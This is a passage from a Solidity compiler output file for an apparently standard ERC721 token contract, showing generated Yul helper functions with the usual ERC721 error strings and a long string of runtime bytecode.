revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b() }\n\n        {\n\n            let offset := 0\n\n            value0 := abi_decode_t_bytes4(add(headStart, offset), dataEnd)\n        }\n\n    }\n\n    function abi_decode_tuple_t_bytes4_fromMemory(headStart, dataEnd) -> value0 {\n        if slt(sub(dataEnd, headStart), 32) { revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b() }\n\n        {\n\n            let offset := 0\n\n            value0 := abi_decode_t_bytes4_fromMemory(add(headStart, offset), dataEnd)\n        }\n\n    }\n\n    function abi_decode_tuple_t_uint256(headStart, dataEnd) -> value0 {\n        if slt(sub(dataEnd, headStart), 32) { revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b() }\n\n        {\n\n            let offset := 0\n\n            value0 := abi_decode_t_uint256(add(headStart, offset), dataEnd)\n        }\n\n    }\n\n    function abi_encode_t_address_to_t_address_fromStack(value, pos) {\n        mstore(pos, cleanup_t_address(value))\n    }\n\n    function abi_encode_t_bool_to_t_bool_fromStack(value, pos) {\n        mstore(pos, cleanup_t_bool(value))\n    }\n\n    function abi_encode_t_bytes_memory_ptr_to_t_bytes_memory_ptr_fromStack(value, pos) -> end {\n        let length := array_length_t_bytes_memory_ptr(value)\n        pos := array_storeLengthForEncoding_t_bytes_memory_ptr_fromStack(pos, length)\n        copy_memory_to_memory(add(value, 0x20), pos, length)\n        end := add(pos, round_up_to_mul_of_32(length))\n    }\n\n    function abi_encode_t_string_memory_ptr_to_t_string_memory_ptr_fromStack(value, pos) -> end {\n        let length := array_length_t_string_memory_ptr(value)\n        pos := array_storeLengthForEncoding_t_string_memory_ptr_fromStack(pos, length)\n        copy_memory_to_memory(add(value, 0x20), pos, length)\n        end := add(pos, round_up_to_mul_of_32(length))\n    }\n\n    function abi_encode_t_string_memory_ptr_to_t_string_memory_ptr_nonPadded_inplace_fromStack(value, pos) -> end {\n        let length := array_length_t_string_memory_ptr(value)\n        pos := array_storeLengthForEncoding_t_string_memory_ptr_nonPadded_inplace_fromStack(pos, length)\n        copy_memory_to_memory(add(value, 0x20), pos, length)\n        end := add(pos, length)\n    }\n\n    function abi_encode_t_stringliteral_12a8e5623d251e191fe4a291d9a59bcc01a4db7a1f5c20fc8de44358c18308af_to_t_string_memory_ptr_fromStack(pos) -> end {\n        pos := array_storeLengthForEncoding_t_string_memory_ptr_fromStack(pos, 45)\n        store_literal_in_memory_12a8e5623d251e191fe4a291d9a59bcc01a4db7a1f5c20fc8de44358c18308af(pos)\n        end := add(pos, 64)\n    }\n\n    function abi_encode_t_stringliteral_1e766a06da43a53d0f4c380e06e5a342e14d5af1bf8501996c844905530ca84e_to_t_string_memory_ptr_fromStack(pos) -> end {\n        pos := array_storeLengthForEncoding_t_string_memory_ptr_fromStack(pos, 50)\n        store_literal_in_memory_1e766a06da43a53d0f4c380e06e5a342e14d5af1bf8501996c844905530ca84e(pos)\n        end := add(pos, 64)\n    }\n\n    function abi_encode_t_stringliteral_277f8ee9d5b4fc3c4149386f24de0fc1bbc63a8210e2197bfd1c0376a2ac5f48_to_t_string_memory_ptr_fromStack(pos) -> end {\n        pos := array_storeLengthForEncoding_t_string_memory_ptr_fromStack(pos, 37)\n        store_literal_in_memory_277f8ee9d5b4fc3c4149386f24de0fc1bbc63a8210e2197bfd1c0376a2ac5f48(pos)\n        end := add(pos, 64)\n    }\n\n    function abi_encode_t_stringliteral_455fea98ea03c32d7dd1a6f1426917d80529bf47b3ccbde74e7206e889e709f4_to_t_string_memory_ptr_fromStack(pos) -> end {\n        pos := array_storeLengthForEncoding_t_string_memory_ptr_fromStack(pos, 36)\n        store_literal_in_memory_455fea98ea03c32d7dd1a6f1426917d80529bf47b3ccbde74e7206e889e709f4(pos)\n        end := add(pos, 64)\n    }\n\n    function abi_encode_t_stringliteral_45fe4329685be5ecd250fd0e6a25aea0ea4d0e30fb6a73c118b95749e6d70d05_to_t_string_memory_ptr_fromStack(pos) -> end {\n        pos := array_storeLengthForEncoding_t_string_memory_ptr_fromStack(pos, 25)\n        store_literal_in_memory_45fe4329685be5ecd250fd0e6a25aea0ea4d0e30fb6a73c118b95749e6d70d05(pos)\n        end := add(pos, 32)\n    }\n\n    function abi_encode_t_stringliteral_6d05c90094f31cfeb8f0eb86f0a513af3f7f8992991fbde41b08aa7960677159_to_t_string_memory_ptr_fromStack(pos) -> end {\n        pos := array_storeLengthForEncoding_t_string_memory_ptr_fromStack(pos, 41)\n        store_literal_in_memory_6d05c90094f31cfeb8f0eb86f0a513af3f7f8992991fbde41b08aa7960677159(pos)\n        end := add(pos, 64)\n    }\n\n    function abi_encode_t_stringliteral_b08d2b0fec7cc108ab049809a8beb42779d969a49299d0c317c907d9db22974f_to_t_string_memory_ptr_fromStack(pos) -> end {\n        pos := array_storeLengthForEncoding_t_string_memory_ptr_fromStack(pos, 24)\n        store_literal_in_memory_b08d2b0fec7cc108ab049809a8beb42779d969a49299d0c317c907d9db22974f(pos)\n        end := add(pos, 32)\n    }\n\n    function abi_encode_t_stringliteral_b51b4875eede07862961e8f9365c6749f5fe55c6ee5d7a9e42b6912ad0b15942_to_t_string_memory_ptr_fromStack(pos) -> end {\n        pos := array_storeLengthForEncoding_t_string_memory_ptr_fromStack(pos, 33)\n        store_literal_in_memory_b51b4875eede07862961e8f9365c6749f5fe55c6ee5d7a9e42b6912ad0b15942(pos)\n        end := add(pos, 64)\n    }\n\n    function abi_encode_t_stringliteral_c6e14a63ffb144eeef7cce6988e5dce07c60a7e0a7b1ef25dbe18c61483e0a83_to_t_string_memory_ptr_fromStack(pos) -> end {\n        pos := array_storeLengthForEncoding_t_string_memory_ptr_fromStack(pos, 61)\n        store_literal_in_memory_c6e14a63ffb144eeef7cce6988e5dce07c60a7e0a7b1ef25dbe18c61483e0a83(pos)\n        end := add(pos, 64)\n    }\n\n    function abi_encode_t_uint256_to_t_uint256_fromStack(value, pos) {\n        mstore(pos, cleanup_t_uint256(value))\n    }\n\n    function abi_encode_tuple_packed_t_string_memory_ptr_t_string_memory_ptr__to_t_string_memory_ptr_t_string_memory_ptr__nonPadded_inplace_fromStack_reversed(pos , value1, value0) -> end {\n\n        pos := abi_encode_t_string_memory_ptr_to_t_string_memory_ptr_nonPadded_inplace_fromStack(value0,  pos)\n\n        pos := abi_encode_t_string_memory_ptr_to_t_string_memory_ptr_nonPadded_inplace_fromStack(value1,  pos)\n\n        end := pos\n    }\n\n    function abi_encode_tuple_t_address__to_t_address__fromStack_reversed(headStart , value0) -> tail {\n        tail := add(headStart, 32)\n\n        abi_encode_t_address_to_t_address_fromStack(value0,  add(headStart, 0))\n\n    }\n\n    function abi_encode_tuple_t_address_t_address_t_uint256_t_bytes_memory_ptr__to_t_address_t_address_t_uint256_t_bytes_memory_ptr__fromStack_reversed(headStart , value3, value2, value1, value0) -> tail {\n        tail := add(headStart, 128)\n\n        abi_encode_t_address_to_t_address_fromStack(value0,  add(headStart, 0))\n\n        abi_encode_t_address_to_t_address_fromStack(value1,  add(headStart, 32))\n\n        abi_encode_t_uint256_to_t_uint256_fromStack(value2,  add(headStart, 64))\n\n        mstore(add(headStart, 96), sub(tail, headStart))\n        tail := abi_encode_t_bytes_memory_ptr_to_t_bytes_memory_ptr_fromStack(value3,  tail)\n\n    }\n\n    function abi_encode_tuple_t_bool__to_t_bool__fromStack_reversed(headStart , value0) -> tail {\n        tail := add(headStart, 32)\n\n        abi_encode_t_bool_to_t_bool_fromStack(value0,  add(headStart, 0))\n\n    }\n\n    function abi_encode_tuple_t_string_memory_ptr__to_t_string_memory_ptr__fromStack_reversed(headStart , value0) -> tail {\n        tail := add(headStart, 32)\n\n        mstore(add(headStart, 0), sub(tail, headStart))\n        tail := abi_encode_t_string_memory_ptr_to_t_string_memory_ptr_fromStack(value0,  tail)\n\n    }\n\n    function abi_encode_tuple_t_stringliteral_12a8e5623d251e191fe4a291d9a59bcc01a4db7a1f5c20fc8de44358c18308af__to_t_string_memory_ptr__fromStack_reversed(headStart ) -> tail {\n        tail := add(headStart, 32)\n\n        mstore(add(headStart, 0), sub(tail, headStart))\n        tail := abi_encode_t_stringliteral_12a8e5623d251e191fe4a291d9a59bcc01a4db7a1f5c20fc8de44358c18308af_to_t_string_memory_ptr_fromStack( tail)\n\n    }\n\n    function abi_encode_tuple_t_stringliteral_1e766a06da43a53d0f4c380e06e5a342e14d5af1bf8501996c844905530ca84e__to_t_string_memory_ptr__fromStack_reversed(headStart ) -> tail {\n        tail := add(headStart, 32)\n\n        mstore(add(headStart, 0), sub(tail, headStart))\n        tail := abi_encode_t_stringliteral_1e766a06da43a53d0f4c380e06e5a342e14d5af1bf8501996c844905530ca84e_to_t_string_memory_ptr_fromStack( tail)\n\n    }\n\n    function abi_encode_tuple_t_stringliteral_277f8ee9d5b4fc3c4149386f24de0fc1bbc63a8210e2197bfd1c0376a2ac5f48__to_t_string_memory_ptr__fromStack_reversed(headStart ) -> tail {\n        tail := add(headStart, 32)\n\n        mstore(add(headStart, 0), sub(tail, headStart))\n        tail := abi_encode_t_stringliteral_277f8ee9d5b4fc3c4149386f24de0fc1bbc63a8210e2197bfd1c0376a2ac5f48_to_t_string_memory_ptr_fromStack( tail)\n\n    }\n\n    function abi_encode_tuple_t_stringliteral_455fea98ea03c32d7dd1a6f1426917d80529bf47b3ccbde74e7206e889e709f4__to_t_string_memory_ptr__fromStack_reversed(headStart ) -> tail {\n        tail := add(headStart, 32)\n\n        mstore(add(headStart, 0), sub(tail, headStart))\n        tail := abi_encode_t_stringliteral_455fea98ea03c32d7dd1a6f1426917d80529bf47b3ccbde74e7206e889e709f4_to_t_string_memory_ptr_fromStack( tail)\n\n    }\n\n    function abi_encode_tuple_t_stringliteral_45fe4329685be5ecd250fd0e6a25aea0ea4d0e30fb6a73c118b95749e6d70d05__to_t_string_memory_ptr__fromStack_reversed(headStart ) -> tail {\n        tail := add(headStart, 32)\n\n        mstore(add(headStart, 0), sub(tail, headStart))\n        tail := abi_encode_t_stringliteral_45fe4329685be5ecd250fd0e6a25aea0ea4d0e30fb6a73c118b95749e6d70d05_to_t_string_memory_ptr_fromStack( tail)\n\n    }\n\n    function abi_encode_tuple_t_stringliteral_6d05c90094f31cfeb8f0eb86f0a513af3f7f8992991fbde41b08aa7960677159__to_t_string_memory_ptr__fromStack_reversed(headStart ) -> tail {\n        tail := add(headStart, 32)\n\n        mstore(add(headStart, 0), sub(tail, headStart))\n        tail := abi_encode_t_stringliteral_6d05c90094f31cfeb8f0eb86f0a513af3f7f8992991fbde41b08aa7960677159_to_t_string_memory_ptr_fromStack( tail)\n\n    }\n\n    function abi_encode_tuple_t_stringliteral_b08d2b0fec7cc108ab049809a8beb42779d969a49299d0c317c907d9db22974f__to_t_string_memory_ptr__fromStack_reversed(headStart ) -> tail {\n        tail := add(headStart, 32)\n\n        mstore(add(headStart, 0), sub(tail, headStart))\n        tail := abi_encode_t_stringliteral_b08d2b0fec7cc108ab049809a8beb42779d969a49299d0c317c907d9db22974f_to_t_string_memory_ptr_fromStack( tail)\n\n    }\n\n    function abi_encode_tuple_t_stringliteral_b51b4875eede07862961e8f9365c6749f5fe55c6ee5d7a9e42b6912ad0b15942__to_t_string_memory_ptr__fromStack_reversed(headStart ) -> tail {\n        tail := add(headStart, 32)\n\n        mstore(add(headStart, 0), sub(tail, headStart))\n        tail := abi_encode_t_stringliteral_b51b4875eede07862961e8f9365c6749f5fe55c6ee5d7a9e42b6912ad0b15942_to_t_string_memory_ptr_fromStack( tail)\n\n    }\n\n    function abi_encode_tuple_t_stringliteral_c6e14a63ffb144eeef7cce6988e5dce07c60a7e0a7b1ef25dbe18c61483e0a83__to_t_string_memory_ptr__fromStack_reversed(headStart ) -> tail {\n        tail := add(headStart, 32)\n\n        mstore(add(headStart, 0), sub(tail, headStart))\n        tail := abi_encode_t_stringliteral_c6e14a63ffb144eeef7cce6988e5dce07c60a7e0a7b1ef25dbe18c61483e0a83_to_t_string_memory_ptr_fromStack( tail)\n\n    }\n\n    function abi_encode_tuple_t_uint256__to_t_uint256__fromStack_reversed(headStart , value0) -> tail {\n        tail := add(headStart, 32)\n\n        abi_encode_t_uint256_to_t_uint256_fromStack(value0,  add(headStart, 0))\n\n    }\n\n    function allocate_memory(size) -> memPtr {\n        memPtr := allocate_unbounded()\n        finalize_allocation(memPtr, size)\n    }\n\n    function allocate_unbounded() -> memPtr {\n        memPtr := mload(64)\n    }\n\n    function array_allocation_size_t_bytes_memory_ptr(length) -> size {\n        // Make sure we can allocate memory without overflow\n        if gt(length, 0xffffffffffffffff) { panic_error_0x41() }\n\n        size := round_up_to_mul_of_32(length)\n\n        // add length slot\n        size := add(size, 0x20)\n\n    }\n\n    function array_length_t_bytes_memory_ptr(value) -> length {\n\n        length := mload(value)\n\n    }\n\n    function array_length_t_string_memory_ptr(value) -> length {\n\n        length := mload(value)\n\n    }\n\n    function array_storeLengthForEncoding_t_bytes_memory_ptr_fromStack(pos, length) -> updated_pos {\n        mstore(pos, length)\n        updated_pos := add(pos, 0x20)\n    }\n\n    function array_storeLengthForEncoding_t_string_memory_ptr_fromStack(pos, length) -> updated_pos {\n        mstore(pos, length)\n        updated_pos := add(pos, 0x20)\n    }\n\n    function array_storeLengthForEncoding_t_string_memory_ptr_nonPadded_inplace_fromStack(pos, length) -> updated_pos {\n        updated_pos := pos\n    }\n\n    function checked_add_t_uint256(x, y) -> sum {\n        x := cleanup_t_uint256(x)\n        y := cleanup_t_uint256(y)\n\n        // overflow, if x > (maxValue - y)\n        if gt(x, sub(0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff, y)) { panic_error_0x11() }\n\n        sum := add(x, y)\n    }\n\n    function checked_sub_t_uint256(x, y) -> diff {\n        x := cleanup_t_uint256(x)\n        y := cleanup_t_uint256(y)\n\n        if lt(x, y) { panic_error_0x11() }\n\n        diff := sub(x, y)\n    }\n\n    function cleanup_t_address(value) -> cleaned {\n        cleaned := cleanup_t_uint160(value)\n    }\n\n    function cleanup_t_bool(value) -> cleaned {\n        cleaned := iszero(iszero(value))\n    }\n\n    function cleanup_t_bytes4(value) -> cleaned {\n        cleaned := and(value, 0xffffffff00000000000000000000000000000000000000000000000000000000)\n    }\n\n    function cleanup_t_uint160(value) -> cleaned {\n        cleaned := and(value, 0xffffffffffffffffffffffffffffffffffffffff)\n    }\n\n    function cleanup_t_uint256(value) -> cleaned {\n        cleaned := value\n    }\n\n    function copy_calldata_to_memory(src, dst, length) {\n        calldatacopy(dst, src, length)\n        // clear end\n        mstore(add(dst, length), 0)\n    }\n\n    function copy_memory_to_memory(src, dst, length) {\n        let i := 0\n        for { } lt(i, length) { i := add(i, 32) }\n        {\n            mstore(add(dst, i), mload(add(src, i)))\n        }\n        if gt(i, length)\n        {\n            // clear end\n            mstore(add(dst, length), 0)\n        }\n    }\n\n    function extract_byte_array_length(data) -> length {\n        length := div(data, 2)\n        let outOfPlaceEncoding := and(data, 1)\n        if iszero(outOfPlaceEncoding) {\n            length := and(length, 0x7f)\n        }\n\n        if eq(outOfPlaceEncoding, lt(length, 32)) {\n            panic_error_0x22()\n        }\n    }\n\n    function finalize_allocation(memPtr, size) {\n        let newFreePtr := add(memPtr, round_up_to_mul_of_32(size))\n        // protect against overflow\n        if or(gt(newFreePtr, 0xffffffffffffffff), lt(newFreePtr, memPtr)) { panic_error_0x41() }\n        mstore(64, newFreePtr)\n    }\n\n    function panic_error_0x11() {\n        mstore(0, 35408467139433450592217433187231851964531694900788300625387963629091585785856)\n        mstore(4, 0x11)\n        revert(0, 0x24)\n    }\n\n    function panic_error_0x12() {\n        mstore(0, 35408467139433450592217433187231851964531694900788300625387963629091585785856)\n        mstore(4, 0x12)\n        revert(0, 0x24)\n    }\n\n    function panic_error_0x22() {\n        mstore(0, 35408467139433450592217433187231851964531694900788300625387963629091585785856)\n        mstore(4, 0x22)\n        revert(0, 0x24)\n    }\n\n    function panic_error_0x41() {\n        mstore(0, 35408467139433450592217433187231851964531694900788300625387963629091585785856)\n        mstore(4, 0x41)\n        revert(0, 0x24)\n    }\n\n    function revert_error_1b9f4a0a5773e33b91aa01db23bf8c55fce1411167c872835e7fa00a4f17d46d() {\n        revert(0, 0)\n    }\n\n    function revert_error_987264b3b1d58a9c7f8255e93e81c77d86d6299019c33110a076957a3e06e2ae() {\n        revert(0, 0)\n    }\n\n    function revert_error_c1322bf8034eace5e0b5c7295db60986aa89aae5e0ea0873e4689e076861a5db() {\n        revert(0, 0)\n    }\n\n    function revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b() {\n        revert(0, 0)\n    }\n\n    function round_up_to_mul_of_32(value) -> result {\n        result := and(add(value, 31), not(31))\n    }\n\n    function store_literal_in_memory_12a8e5623d251e191fe4a291d9a59bcc01a4db7a1f5c20fc8de44358c18308af(memPtr) {\n\n        mstore(add(memPtr, 0), \"ERC721: caller is not token owne\")\n\n        mstore(add(memPtr, 32), \"r or approved\")\n\n    }\n\n    function store_literal_in_memory_1e766a06da43a53d0f4c380e06e5a342e14d5af1bf8501996c844905530ca84e(memPtr) {\n\n        mstore(add(memPtr, 0), \"ERC721: transfer to non ERC721Re\")\n\n        mstore(add(memPtr, 32), \"ceiver implementer\")\n\n    }\n\n    function store_literal_in_memory_277f8ee9d5b4fc3c4149386f24de0fc1bbc63a8210e2197bfd1c0376a2ac5f48(memPtr) {\n\n        mstore(add(memPtr, 0), \"ERC721: transfer from incorrect \")\n\n        mstore(add(memPtr, 32), \"owner\")\n\n    }\n\n    function store_literal_in_memory_455fea98ea03c32d7dd1a6f1426917d80529bf47b3ccbde74e7206e889e709f4(memPtr) {\n\n        mstore(add(memPtr, 0), \"ERC721: transfer to the zero add\")\n\n        mstore(add(memPtr, 32), \"ress\")\n\n    }\n\n    function store_literal_in_memory_45fe4329685be5ecd250fd0e6a25aea0ea4d0e30fb6a73c118b95749e6d70d05(memPtr) {\n\n        mstore(add(memPtr, 0), \"ERC721: approve to caller\")\n\n    }\n\n    function store_literal_in_memory_6d05c90094f31cfeb8f0eb86f0a513af3f7f8992991fbde41b08aa7960677159(memPtr) {\n\n        mstore(add(memPtr, 0), \"ERC721: address zero is not a va\")\n\n        mstore(add(memPtr, 32), \"lid owner\")\n\n    }\n\n    function store_literal_in_memory_b08d2b0fec7cc108ab049809a8beb42779d969a49299d0c317c907d9db22974f(memPtr) {\n\n        mstore(add(memPtr, 0), \"ERC721: invalid token ID\")\n\n    }\n\n    function store_literal_in_memory_b51b4875eede07862961e8f9365c6749f5fe55c6ee5d7a9e42b6912ad0b15942(memPtr) {\n\n        mstore(add(memPtr, 0), \"ERC721: approval to current owne\")\n\n        mstore(add(memPtr, 32), \"r\")\n\n    }\n\n    function store_literal_in_memory_c6e14a63ffb144eeef7cce6988e5dce07c60a7e0a7b1ef25dbe18c61483e0a83(memPtr) {\n\n        mstore(add(memPtr, 0), \"ERC721: approve caller is not to\")\n\n        mstore(add(memPtr, 32), \"ken owner or approved for all\")\n\n    }\n\n    function validator_revert_t_address(value) {\n        if iszero(eq(value, cleanup_t_address(value))) { revert(0, 0) }\n    }\n\n    function validator_revert_t_bool(value) {\n        if iszero(eq(value, cleanup_t_bool(value))) { revert(0, 0) }\n    }\n\n    function validator_revert_t_bytes4(value) {\n        if iszero(eq(value, cleanup_t_bytes4(value))) { revert(0, 0) }\n    }\n\n    function validator_revert_t_uint256(value) {\n        if iszero(eq(value, cleanup_t_uint256(value))) { revert(0, 0) }\n    }\n\n}\n","id":15,"language":"Yul","name":"#utility.yul"}],"immutableReferences":{},"linkReferences":{},"object":"608060405234801561001057600080fd5b50600436106100cf5760003560e01c80636352211e1161008c578063a22cb46511610066578063a22cb46514610224578063b88d4fde14610240578063c87b56dd1461025c578063e985e9c51461028c576100cf565b80636352211e146101a657806370a08231146101d657806395d89b4114610206576100cf565b806301ffc9a7146100d457806306fdde0314610104578063081812fc14610122578063095ea7b31461015257806323b872dd1461016e57806342842e0e1461018a575b600080fd5b6100ee60048036038101906100e99190611863565b6102bc565b6040516100fb9190611b80565b60405180910390f35b61010c61039e565b6040516101199190611b9b565b60405180910390f35b61013c600480360381019061013791906118bd565b610430565b6040516101499190611b19565b60405180910390f35b61016c60048036038101906101679190611823565b610476565b005b6101886004803603810190610183919061170d565b61058e565b005b6101a4600480360381019061019f919061170d565b6105ee565b005b6101c060048036038101906101bb91906118bd565b61060e565b6040516101cd9190611b19565b60405180910390f35b6101f060048036038101906101eb91906116a0565b610695565b6040516101fd9190611cdd565b60405180910390f35b61020e61074d565b60405161021b9190611b9b565b60405180910390f35b61023e600480360381019061023991906117e3565b6107df565b005b61025a60048036038101906102559190611760565b6107f5565b005b610276600480360381019061027191906118bd565b610857565b6040516102839190611b9b565b60405180910390f35b6102a660048036038101906102a191906116cd565b6108bf565b6040516102b39190611b80565b60405180910390f35b60007f80ac58cd000000000000000000000000000000000000000000000000000000007bffffffffffffffffffffffffffffffffffffffffffffffffffffffff1916827bffffffffffffffffffffffffffffffffffffffffffffffffffffffff1916148061038757507f5b5e139f000000000000000000000000000000000000000000000000000000007bffffffffffffffffffffffffffffffffffffffffffffffffffffffff1916827bffffffffffffffffffffffffffffffffffffffffffffffffffffffff1916145b80610397575061039682610953565b5b9050919050565b6060600080546103ad90611ed1565b80601f01602080910402602001604051908101604052809291908181526020018280546103d990611ed1565b80156104265780601f106103fb57610100808354040283529160200191610426565b820191906000526020600020905b81548152906001019060200180831161040957829003601f168201915b5050505050905090565b600061043b826109bd565b6004600083815260200190815260200160002060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff169050919050565b60006104818261060e565b90508073ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff1614156104f2576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016104e990611c9d565b60405180910390fd5b8073ffffffffffffffffffffffffffffffffffffffff16610511610a08565b73ffffffffffffffffffffffffffffffffffffffff161480610540575061053f8161053a610a08565b6108bf565b5b61057f576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161057690611cbd565b60405180910390fd5b6105898383610a10565b505050565b61059f610599610a08565b82610ac9565b6105de576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016105d590611bbd565b60405180910390fd5b6105e9838383610b5e565b505050565b610609838383604051806020016040528060008152506107f5565b505050565b60008061061a83610e58565b9050600073ffffffffffffffffffffffffffffffffffffffff168173ffffffffffffffffffffffffffffffffffffffff16141561068c576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161068390611c7d565b60405180910390fd5b80915050919050565b60008073ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff161415610706576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016106fd90611c5d565b60405180910390fd5b600360008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020549050919050565b60606001805461075c90611ed1565b80601f016020809104026020016040519081016040528092919081815260200182805461078890611ed1565b80156107d55780601f106107aa576101008083540402835291602001916107d5565b820191906000526020600020905b8154815290600101906020018083116107b857829003601f168201915b5050505050905090565b6107f16107ea610a08565b8383610e95565b5050565b610806610800610a08565b83610ac9565b610845576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161083c90611bbd565b60405180910390fd5b61085184848484611002565b50505050565b6060610862826109bd565b600061086c61105e565b9050600081511161088c57604051806020016040528060008152506108b7565b8061089684611075565b6040516020016108a7929190611af5565b6040516020818303038152906040525b915050919050565b6000600560008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060009054906101000a900460ff16905092915050565b60007f01ffc9a7000000000000000000000000000000000000000000000000000000007bffffffffffffffffffffffffffffffffffffffffffffffffffffffff1916827bffffffffffffffffffffffffffffffffffffffffffffffffffffffff1916149050919050565b6109c68161114d565b610a05576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016109fc90611c7d565b60405180910390fd5b50565b600033905090565b816004600083815260200190815260200160002060006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550808273ffffffffffffffffffffffffffffffffffffffff16610a838361060e565b73ffffffffffffffffffffffffffffffffffffffff167f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b92560405160405180910390a45050565b600080610ad58361060e565b90508073ffffffffffffffffffffffffffffffffffffffff168473ffffffffffffffffffffffffffffffffffffffff161480610b175750610b1681856108bf565b5b80610b5557508373ffffffffffffffffffffffffffffffffffffffff16610b3d84610430565b73ffffffffffffffffffffffffffffffffffffffff16145b91505092915050565b8273ffffffffffffffffffffffffffffffffffffffff16610b7e8261060e565b73ffffffffffffffffffffffffffffffffffffffff1614610bd4576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610bcb90611bfd565b60405180910390fd5b600073ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff161415610c44576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610c3b90611c1d565b60405180910390fd5b610c51838383600161118e565b8273ffffffffffffffffffffffffffffffffffffffff16610c718261060e565b73ffffffffffffffffffffffffffffffffffffffff1614610cc7576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610cbe90611bfd565b60405180910390fd5b6004600082815260200190815260200160002060006101000a81549073ffffffffffffffffffffffffffffffffffffffff02191690556001600360008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600082825403925050819055506001600360008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008282540192505081905550816002600083815260200190815260200160002060006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550808273ffffffffffffffffffffffffffffffffffffffff168473ffffffffffffffffffffffffffffffffffffffff167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef60405160405180910390a4610e5383838360016112b4565b505050565b60006002600083815260200190815260200160002060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff169050919050565b8173ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff161415610f04576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610efb90611c3d565b60405180910390fd5b80600560008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060006101000a81548160ff0219169083151502179055508173ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff167f17307eab39ab6107e8899845ad3d59bd9653f200f220920489ca2b5937696c3183604051610ff59190611b80565b60405180910390a3505050565b61100d848484610b5e565b611019848484846112ba565b611058576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161104f90611bdd565b60405180910390fd5b50505050565b606060405180602001604052806000815250905090565b60606000600161108484611451565b01905060008167ffffffffffffffff8111156110a3576110a2611fc1565b5b6040519080825280601f01601f1916602001820160405280156110d55781602001600182028036833780820191505090505b509050600082602001820190505b600115611142578080600190039150507f3031323334353637383961626364656600000000000000000000000000000000600a86061a8153600a858161112c5761112b611f63565b5b049450600085141561113d57611142565b6110e3565b819350505050919050565b60008073ffffffffffffffffffffffffffffffffffffffff1661116f83610e58565b73ffffffffffffffffffffffffffffffffffffffff1614159050919050565b60018111156112ae57600073ffffffffffffffffffffffffffffffffffffffff168473ffffffffffffffffffffffffffffffffffffffff16146112225780600360008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600082825461121a9190611de7565b925050819055505b600073ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff16146112ad5780600360008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008282546112a59190611d91565b925050819055505b5b50505050565b50505050565b60006112db8473ffffffffffffffffffffffffffffffffffffffff166115a4565b15611444578373ffffffffffffffffffffffffffffffffffffffff1663150b7a02611304610a08565b8786866040518563ffffffff1660e01b81526004016113269493929190611b34565b602060405180830381600087803b15801561134057600080fd5b505af192505050801561137157506040513d601f19601f8201168201806040525081019061136e9190611890565b60015b6113f4573d80600081146113a1576040519150601f19603f3d011682016040523d82523d6000602084013e6113a6565b606091505b506000815114156113ec576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016113e390611bdd565b60405180910390fd5b805181602001fd5b63150b7a0260e01b7bffffffffffffffffffffffffffffffffffffffffffffffffffffffff1916817bffffffffffffffffffffffffffffffffffffffffffffffffffffffff191614915050611449565b600190505b949350505050565b600080600090507a184f03e93ff9f4daa797ed6e38ed64bf6a1f01000000000000000083106114af577a184f03e93ff9f4daa797ed6e38ed64bf6a1f01000000000000000083816114a5576114a4611f63565b5b0492506040810190505b6d04ee2d6d415b85acef810000000083106114ec576d04ee2d6d415b85acef810000000083816114e2576114e1611f63565b5b0492506020810190505b662386f26fc10000831061151b57662386f26fc10000838161151157611510611f63565b5b0492506010810190505b6305f5e1008310611544576305f5e100838161153a57611539611f63565b5b0492506008810190505b612710831061156957612710838161155f5761155e611f63565b5b0492506004810190505b6064831061158c576064838161158257611581611f63565b5b0492506002810190505b600a831061159b576001810190505b80915050919050565b6000808273ffffffffffffffffffffffffffffffffffffffff163b119050919050565b60006115da6115d584611d1d565b611cf8565b9050828152602081018484840